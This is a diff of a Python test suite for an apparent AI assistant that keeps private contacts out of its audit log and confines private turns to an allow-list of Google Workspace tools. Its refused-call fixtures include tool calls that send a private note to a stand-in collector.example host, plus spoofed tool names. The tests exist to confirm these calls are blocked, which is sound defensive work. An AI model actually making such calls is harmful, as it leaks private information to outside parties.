@@ -17,7 +17,7 @@ from contextlib import contextmanager
 from pathlib import Path
 from types import SimpleNamespace
 from typing import Any
-from unittest.mock import AsyncMock, patch
+from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 from fastapi import FastAPI
@@ -342,6 +342,307 @@ def test_the_previous_mails_private_turn_does_not_colour_the_next(roster: Simple
     assert rows and {flag for _t, flag in rows} == {False}
 
 
+def _audited_retrieve(query: str = "", **_kw: Any) -> str:
+    """retrieve() as the audit log sees it: one knowledge_retrieval row
+    carrying the query."""
+    from openexecutive.knowledge import retriever
+
+    retriever._emit_retrieval_audit(
+        query=query, domain_filter=None, specialist_name=None, builtin_results=[],
+        company_results=[], annotation_count=0, collection="builtin",
+    )
+    return ""
+
+
+class _ReplyingExecutive:
+    """The Executive as far as these tests need it. Its reply writes one row
+    with no session bound, like any row written before a turn binds one."""
+
+    def __init__(self, **_kw: Any) -> None:
+        pass
+
+    async def chat(self, **_kw: Any) -> str:
+        log_event("chat_turn", "Executive: the reply")
+        return "ok"
+
+
+def _new_rows(before: set[int]) -> list[Any]:
+    return [e for e in _audit().query(limit=1000) if e.id not in before]
+
+
+def _handle_through_the_turn(raw: str) -> list[Any]:
+    """The poller's handling of one mail, its turn included (the model
+    replaced), so every row it writes is seen."""
+    import openexecutive.integrations.email_poller as poller
+    from openexecutive.memory.company_profile import CompanyProfile
+
+    before = {e.id for e in _audit().query(limit=1000)}
+    gateway = AsyncMock()
+    gateway.call_tool = AsyncMock(return_value=raw)
+    settings = SimpleNamespace(exec_email_address=EXEC, email_poll_interval_seconds=60)
+
+    async def _mark_read(*_args: Any) -> None:
+        log_event("integration_inbound", "Marked the mail read")
+
+    with (
+        patch.object(poller, "get_settings", return_value=settings),
+        patch.object(poller, "_mark_read", new=_mark_read),
+        patch("openexecutive.knowledge.retriever.retrieve", side_effect=_audited_retrieve),
+        patch("openexecutive.memory.episodic.format_for_prompt", return_value=""),
+        patch("openexecutive.onboarding.profile_builder.load_or_create_profile",
+              return_value=CompanyProfile()),
+        patch("openexecutive.orchestrator.executive.Executive", _ReplyingExecutive),
+    ):
+        asyncio.run(poller._handle_email(gateway, "m1", "t1", EXEC))
+    return _new_rows(before)
+
+
+@pytest.mark.parametrize(("sender", "body", "private"), [
+    (CONTACT_EMAIL, "Body text here.", True),
+    (OWNER_EMAIL, FORWARDED_BODY, True),
+    (TEAM_EMAIL, "Body text here.", False),
+    ("stranger@elsewhere.example", "Body text here.", False),
+])
+def test_every_row_written_while_a_private_mail_is_handled_is_private(
+    roster: SimpleNamespace, sender: str, body: str, private: bool
+) -> None:
+    rows = _handle_through_the_turn(_raw(sender, body))
+    assert {"knowledge_retrieval", "integration_inbound", "chat_turn"} <= {
+        e.event_type for e in rows
+    }
+    assert {e.private for e in rows} == {private}
+    # The retrieval runs before the turn binds its session, and quotes the
+    # mail: its From line and the start of the body.
+    [retrieval] = [e for e in rows if e.event_type == "knowledge_retrieval"]
+    assert f"From: {sender}" in retrieval.details["query"]
+    # The scope ends with the mail's handling.
+    log_event("chat_turn", "after the mail")
+    assert _private_flags()["after the mail"] is False
+
+
+# --- Chat messages from the principal, before their turn binds its session --
+
+
+_NAMES_A_CONTACT = f"Email {CONTACT_EMAIL} about the renewal"
+_NAMES_NOBODY = "Where are we on hiring?"
+
+
+@contextmanager
+def _chat_adapter_stubs() -> Iterator[None]:
+    """Everything a chat adapter calls apart from the roster and the audit
+    log, which stay real."""
+    from openexecutive.memory.company_profile import CompanyProfile
+
+    executive = MagicMock()
+    executive.return_value.chat = AsyncMock(return_value="ok")
+    with (
+        patch("openexecutive.orchestrator.executive.Executive", executive),
+        patch("openexecutive.knowledge.retriever.retrieve", side_effect=_audited_retrieve),
+        patch("openexecutive.memory.episodic.format_for_prompt", return_value=""),
+        patch("openexecutive.memory.session_store.load_messages", return_value=[]),
+        patch("openexecutive.memory.session_store.create_session"),
+        patch("openexecutive.memory.session_store.save_message"),
+        patch("openexecutive.memory.session_store.update_session_timestamp"),
+        patch("openexecutive.onboarding.profile_builder.load_or_create_profile",
+              return_value=CompanyProfile()),
+        patch("openexecutive.alerts.pipeline.schedule_evaluation"),
+        patch("openexecutive.mcp_server.server.get_store", return_value=None),
+        patch("openexecutive.workflows.inbound_resolver.resolve_inbound_message",
+              new=AsyncMock(return_value=None)),
+        patch("openexecutive.orchestrator.mcp_gateway.get_active_gateway", return_value=None),
+    ):
+        yield
+
+
+def _flags_by_type(rows: list[Any]) -> dict[str, set[bool]]:
+    out: dict[str, set[bool]] = {}
+    for e in rows:
+        out.setdefault(e.event_type, set()).add(e.private)
+    return out
+
+
+def _slack(monkeypatch: pytest.MonkeyPatch, user: str, text: str) -> list[Any]:
+    from contextlib import suppress
+
+    from openexecutive.config import get_settings
+    from openexecutive.integrations import slack_bot
+
+    stub = get_settings().model_copy(
+        update={"slack_bot_token": "xoxb-test", "slack_app_token": "xapp-test"}
+    )
+    monkeypatch.setattr("openexecutive.config.get_settings", lambda: stub)
+    monkeypatch.setattr(
+        "slack_sdk.web.async_client.AsyncWebClient.auth_test",
+        AsyncMock(return_value={"user_id": "UBOT"}),
+    )
+    monkeypatch.setattr(slack_bot, "_bot_user_id", None)
+    event = {"text": text, "user": user, "channel": "D1", "channel_type": "im",
+             "ts": "1700000000.0"}
+
+    async def _go() -> None:
+        app, handler = await slack_bot.create_slack_app()
+        try:
+            listeners = {
+                listener.ack_function.__name__: listener.ack_function
+                for listener in app._async_listeners
+            }
+            client = MagicMock()
+            client.conversations_replies = AsyncMock(return_value={"messages": []})
+            await listeners["handle_message"](event=event, say=AsyncMock(), client=client)
+        finally:
+            with suppress(Exception):
+                await handler.close_async()
+            http = getattr(app.client, "session", None)
+            if http is not None and not http.closed:
+                await http.close()
+
+    before = {e.id for e in _audit().query(limit=1000)}
+    with _chat_adapter_stubs():
+        asyncio.run(_go())
+    return _new_rows(before)
+
+
+def _discord(user: str, text: str) -> list[Any]:
+    from openexecutive.integrations import discord_bot
+
+    before = {e.id for e in _audit().query(limit=1000)}
+    with _chat_adapter_stubs():
+        asyncio.run(discord_bot._handle_message(
+            text=text, discord_user_id=user, discord_channel="dm-1", message_id="m1",
+            thread_id=None, send_fn=AsyncMock(), is_dm=True,
+            session_id=f"discord:user:{user}", session_title="DM",
+        ))
+    return _new_rows(before)
+
+
+def _telegram(chat_id: str, text: str, verified: bool = True) -> list[Any]:
+    from openexecutive.config import get_settings
+    from openexecutive.integrations import telegram_bot
+
+    settings = get_settings().model_copy(
+        update={"telegram_webhook_secret": "s3cret-value" if verified else None}
+    )
+    before = {e.id for e in _audit().query(limit=1000)}
+    with (
+        _chat_adapter_stubs(),
+        patch("openexecutive.config.get_settings", return_value=settings),
+        patch.object(telegram_bot, "send_message", new=AsyncMock(return_value=None)),
+    ):
+        asyncio.run(telegram_bot._process_and_reply(
+            message_text=text, sender_name="someone", chat_id=int(chat_id),
+            message_id=1, token="t",
+        ))
+    return _new_rows(before)
+
+
+def _web(monkeypatch: pytest.MonkeyPatch, tmp_path: Path, email: str, text: str) -> list[Any]:
+    from openexecutive.api.routes import chat as chat_route
+    from openexecutive.memory.company_profile import CompanyProfile
+
+    # The session store binds ./episodic_memory.db as a default argument.
+    monkeypatch.chdir(tmp_path)
+    chat_route._sessions.clear()
+
+    from openexecutive.orchestrator.executive import Executive
+
+    class _Streaming:
+        """Writes a row quoting the message from inside the stream, before
+        the real Executive would bind the caller to the session."""
+
+        _THINKING = Executive._THINKING
+
+        def __init__(self, **_kw: Any) -> None:
+            pass
+
+        async def stream_chat(self, **kw: Any) -> Any:
+            log_event("memory_snapshot", f"Turn start: {kw['user_message']}")
+            yield "ok"
+
+    async def _no_title(*_a: Any, **_k: Any) -> None:
+        return None
+
+    app = FastAPI()
+    app.include_router(chat_route.router)
+    before = {e.id for e in _audit().query(limit=1000)}
+    with (
+        patch("openexecutive.utils.session_title.generate_session_title", _no_title),
+        patch("openexecutive.orchestrator.executive.Executive", _Streaming),
+        patch("openexecutive.knowledge.retriever.retrieve", side_effect=_audited_retrieve),
+        patch("openexecutive.onboarding.profile_builder.load_or_create_profile",
+              return_value=CompanyProfile()),
+    ):
+        response = TestClient(app).post(
+            "/chat", json={"message": text}, headers={"x-caller-email": email}
+        )
+        assert response.status_code == 200
+        _ = response.text
+    chat_route._sessions.clear()
+    return _new_rows(before)
+
+
+def _surface_rows(
+    surface: str, who: str, text: str, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> list[Any]:
+    ids = {
+        "slack": {"principal": "U_OWNER", "teammate": "U_BEN"},
+        "discord": {"principal": "1001", "teammate": "1002"},
+        "telegram": {"principal": "5001", "teammate": "5002"},
+        "web": {"principal": OWNER_EMAIL, "teammate": TEAM_EMAIL},
+    }[surface][who]
+    if surface == "slack":
+        return _slack(monkeypatch, ids, text)
+    if surface == "discord":
+        return _discord(ids, text)
+    if surface == "telegram":
+        return _telegram(ids, text)
+    return _web(monkeypatch, tmp_path, ids, text)
+
+
+# The row each surface writes with the message text before the turn binds
+# its session, besides the knowledge retrieval.
+_FIRST_ROW = {"slack": "integration_inbound", "discord": "integration_inbound",
+              "telegram": "integration_inbound", "web": "chat_turn"}
+
+
+@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "web"])
+def test_the_principals_rows_naming_a_contact_are_private_before_the_turn_binds(
+    roster: SimpleNamespace, surface: str, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+) -> None:
+    flags = _flags_by_type(
+        _surface_rows(surface, "principal", _NAMES_A_CONTACT, monkeypatch, tmp_path)
+    )
+    assert flags[_FIRST_ROW[surface]] == {True}
+    assert flags["knowledge_retrieval"] == {True}
+    if surface == "web":
+        assert flags["memory_snapshot"] == {True}
+
+
+@pytest.mark.parametrize("surface", ["slack", "discord", "telegram", "web"])
+@pytest.mark.parametrize(("who", "text"), [
+    ("principal", _NAMES_NOBODY),
+    # On a teammate's turn a contact is a stranger: hiding the row would tell
+    # them the address is one.
+    ("teammate", _NAMES_A_CONTACT),
+])
+def test_other_chat_rows_stay_visible(
+    roster: SimpleNamespace, surface: str, who: str, text: str,
+    monkeypatch: pytest.MonkeyPatch, tmp_path: Path,
+) -> None:
+    rows = _surface_rows(surface, who, text, monkeypatch, tmp_path)
+    flags = _flags_by_type(rows)
+    assert flags[_FIRST_ROW[surface]] == {False}
+    assert flags["knowledge_retrieval"] == {False}
+    if surface == "web":
+        assert flags["memory_snapshot"] == {False}
+
+
+def test_an_unverified_telegram_chat_is_not_the_principals_turn(roster: SimpleNamespace) -> None:
+    # Without a usable webhook secret anyone can post an update naming the
+    # principal's chat id, so it proves nothing and a contact stays a stranger.
+    flags = _flags_by_type(_telegram("5001", _NAMES_A_CONTACT, verified=False))
+    assert flags["integration_inbound"] == {False}
+
+
 # =========================================================================== #
 # M1: who can read them — every /audit read route
 # =========================================================================== #
@@ -648,7 +949,7 @@ def test_a_private_turn_refuses_load_mcp_server(roster: SimpleNamespace) -> None
     gateway.load_mcp_server.assert_awaited_once()
 
 
-# --- MCP servers other than Google Workspace --------------------------------
+# --- MCP tools: Google Workspace reads and the gated Gmail send only --------
 
 
 def _search_block(name: str, description: str) -> str:
@@ -660,13 +961,32 @@ def _search_block(name: str, description: str) -> str:
 
 
 _SEARCH_TEXT = (
-    "Found 3 matching tool(s). Use `call_tool` with the tool name and arguments "
+    "Found 4 matching tool(s). Use `call_tool` with the tool name and arguments "
     "to invoke one.\n\n" + "\n".join([
         _search_block("slack__post_message", "Post a message to a Slack channel."),
         _search_block("google_workspace__send_gmail_message", "Send an email."),
+        _search_block("google_workspace__send_message", "Send a Google Chat message."),
         _search_block("fetch__fetch", "Fetch a URL."),
     ])
 )
+
+_NOTE = "Jordan wants pricing by Friday"
+
+# Refused on a private turn: other servers, a server loaded under a
+# Google-looking name, and the Google Workspace tools that reach people with
+# no recipient check (a Chat message, a Docs write, a Drive file fetched from
+# a URL, an event on a shared calendar).
+_REFUSED_CALLS: list[tuple[str, dict[str, Any]]] = [
+    ("slack__post_message", {"channel": "#sales", "text": _NOTE}),
+    ("fetch__fetch", {"url": "https://collector.example/?q=Jordan+pricing"}),
+    ("google_workspace__x__send", {"text": _NOTE}),
+    ("google_workspace__send_message", {"space_id": "spaces/AAA", "message_text": _NOTE}),
+    ("google_workspace__modify_doc_text", {"document_id": "shared-doc", "text": _NOTE}),
+    ("google_workspace__create_drive_file",
+     {"file_name": "n.txt", "fileUrl": "https://collector.example/?q=Jordan"}),
+    ("google_workspace__manage_event",
+     {"action": "create", "calendar_id": "team@group.calendar.google.com", "summary": _NOTE}),
+]
 
 
 def _real_gateway() -> tuple[Any, list[tuple[str, dict[str, Any]]]]:
@@ -693,17 +1013,17 @@ def _mcp_round() -> list[Any]:
     def _call(i: int, tool: str, arguments: dict[str, Any]) -> Any:
         return _use(i, "call_tool", {"name": tool, "arguments": arguments})
 
-    note = "Jordan wants pricing by Friday"
+    refused = [_call(i, tool, args) for i, (tool, args) in enumerate(_REFUSED_CALLS, start=2)]
+    n = len(_REFUSED_CALLS) + 2
     return [
         _use(1, "search_tools", {"query": "send a message"}),
-        _call(2, "slack__post_message", {"channel": "#sales", "text": note}),
-        _call(3, "fetch__fetch", {"url": "https://collector.example/?q=Jordan+pricing"}),
-        # A server loaded at runtime as "google_workspace__x" is not Google's.
-        _call(4, "google_workspace__x__send", {"text": note}),
-        _call(5, "google_workspace__send_gmail_message",
-              {"to": OWNER_EMAIL, "subject": "Jordan", "body": note}),
-        _call(6, "google_workspace__send_gmail_message",
-              {"to": TEAM_EMAIL, "subject": "Jordan", "body": note}),
+        *refused,
+        _call(n, "google_workspace__get_gmail_message_content",
+              {"message_id": "m1", "user_google_email": EXEC}),
+        _call(n + 1, "google_workspace__send_gmail_message",
+              {"to": OWNER_EMAIL, "subject": "Jordan", "body": _NOTE}),
+        _call(n + 2, "google_workspace__send_gmail_message",
+              {"to": TEAM_EMAIL, "subject": "Jordan", "body": _NOTE}),
     ]
 
 
@@ -718,25 +1038,31 @@ def _run_mcp_round(session: Session) -> tuple[_ScriptedStreams, dict[str, str], 
     return provider, results, reached
 
 
-def test_a_private_turn_reaches_no_mcp_server_but_google_workspace(
+def test_a_private_turn_reaches_only_google_reads_and_the_gated_gmail_send(
     roster: SimpleNamespace,
 ) -> None:
     from openexecutive.orchestrator.people_tools import PRIVATE_TURN_REFUSAL
 
     provider, results, reached = _run_mcp_round(_private_turn(roster))
+    n = len(_REFUSED_CALLS) + 2
     # Offered: search_tools and call_tool stay (Gmail goes through them), and
-    # a search shows Google Workspace's tools only.
+    # a search shows only the allowed tools.
     assert {"call_tool", "search_tools"} <= set(_offered(provider))
     assert "load_mcp_server" not in _offered(provider)
     assert "## google_workspace__send_gmail_message\n" in results["tu-1"]
-    assert "slack__" not in results["tu-1"] and "fetch__" not in results["tu-1"]
-    # Dispatched: only the email to the principal reaches the server.
-    assert [name for name, _ in reached] == ["search_tools", "call_tool"]
-    assert reached[1][1]["tool_name"] == "google_workspace__send_gmail_message"
-    assert reached[1][1]["arguments"]["to"] == OWNER_EMAIL
-    # The Gmail gate still narrows the turn to the principal.
-    assert "EMAIL_ALLOWED_SENDERS" in json.loads(results["tu-6"])["error"]
-    refused = ["slack__post_message", "fetch__fetch", "google_workspace__x__send"]
+    for hidden in ("slack__", "fetch__", "google_workspace__send_message"):
+        assert hidden not in results["tu-1"]
+    # Dispatched: the Gmail read and the email to the principal only.
+    called = [(args["tool_name"], args["arguments"]) for name, args in reached
+              if name == "call_tool"]
+    assert [tool for tool, _ in called] == [
+        "google_workspace__get_gmail_message_content",
+        "google_workspace__send_gmail_message",
+    ]
+    assert called[1][1]["to"] == OWNER_EMAIL
+    # The Gmail gate still narrows the send to the principal.
+    assert "EMAIL_ALLOWED_SENDERS" in json.loads(results[f"tu-{n + 2}"])["error"]
+    refused = [tool for tool, _ in _REFUSED_CALLS]
     for i, tool in enumerate(refused, start=2):
         error = json.loads(results[f"tu-{i}"])["error"]
         assert tool in error and PRIVATE_TURN_REFUSAL in error
@@ -750,7 +1076,7 @@ def test_a_private_turn_reaches_no_mcp_server_but_google_workspace(
 
 
 @pytest.mark.parametrize("surface", ["email", "principal_web", "teammate_web"])
-def test_other_turns_search_and_call_every_mcp_server_unchanged(
+def test_other_turns_search_and_call_every_mcp_tool_unchanged(
     roster: SimpleNamespace, surface: str
 ) -> None:
     session = {
@@ -761,20 +1087,42 @@ def test_other_turns_search_and_call_every_mcp_server_unchanged(
     provider, results, reached = _run_mcp_round(session)
     assert results["tu-1"] == _SEARCH_TEXT
     called = [args["tool_name"] for name, args in reached if name == "call_tool"]
-    # Every call reaches the server; the Gmail gate alone decides the rest.
-    assert called[:3] == ["slack__post_message", "fetch__fetch", "google_workspace__x__send"]
+    # Every call reaches the gateway; its own gates alone decide the rest.
+    assert called[:len(_REFUSED_CALLS) + 1] == [
+        *(tool for tool, _ in _REFUSED_CALLS), "google_workspace__get_gmail_message_content",
+    ]
     assert "load_mcp_server" in _offered(provider)
     assert not any("refused" in e.summary for e in _audit().query(limit=1000))
 
 
+def test_the_private_turn_allow_list_is_reads_and_gated_gmail_only() -> None:
+    from openexecutive.orchestrator.mcp_gateway import (
+        _GATED_CALENDAR_TOOLS,
+        _GATED_GMAIL_TOOLS,
+        _is_drive_share_tool,
+    )
+    from openexecutive.orchestrator.schedule_tools import PRIVATE_TURN_MCP_TOOLS
+    from openexecutive.workflows.tool_catalog import _read_only_label
+
+    assert _GATED_GMAIL_TOOLS <= PRIVATE_TURN_MCP_TOOLS
+    for name in PRIVATE_TURN_MCP_TOOLS - _GATED_GMAIL_TOOLS:
+        assert _read_only_label(name, {}) is True, name
+        assert name not in _GATED_CALENDAR_TOOLS and not _is_drive_share_tool(name)
+
+
 @pytest.mark.parametrize(("name", "allowed"), [
     ("google_workspace__send_gmail_message", True),
-    ("google_workspace__manage_event", True),
-    ("slack__post_message", False),
-    ("fetch__fetch", False),
-    ("google_workspace__x__send", False),
-    ("google_workspace___send", False),
-    ("google_workspace__", False),
+    ("google_workspace__draft_gmail_message", True),
+    ("google_workspace__search_gmail_messages", True),
+    ("google_workspace__get_gmail_message_content", True),
+    ("google_workspace__get_events", True),
+    ("google_workspace__list_calendars", True),
+    ("google_workspace__query_freebusy", True),
+    ("google_workspace__search_drive_files", True),
+    *((tool, False) for tool, _ in _REFUSED_CALLS),
+    ("google_workspace__modify_gmail_message_labels", False),
+    ("google_workspace__manage_drive_access", False),
+    ("google_workspace___send_gmail_message", False),
     ("google_workspace__send_gmail_message\n", False),
     ("Google_Workspace__send_gmail_message", False),
     ("", False),
